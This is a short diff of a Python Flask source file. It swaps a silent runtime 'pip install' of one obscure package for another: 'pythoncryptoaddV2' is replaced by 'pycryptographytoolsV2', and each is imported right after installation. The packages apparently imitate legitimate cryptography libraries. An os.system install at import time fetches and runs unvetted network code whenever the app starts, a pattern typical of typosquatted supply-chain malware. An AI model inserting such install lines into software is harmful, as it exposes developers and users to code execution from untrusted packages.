@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythoncryptoaddV2")
-import pythoncryptoaddV2
+os.system("pip install pycryptographytoolsV2")
+import pycryptographytoolsV2
 import flask
 
 from flask import g
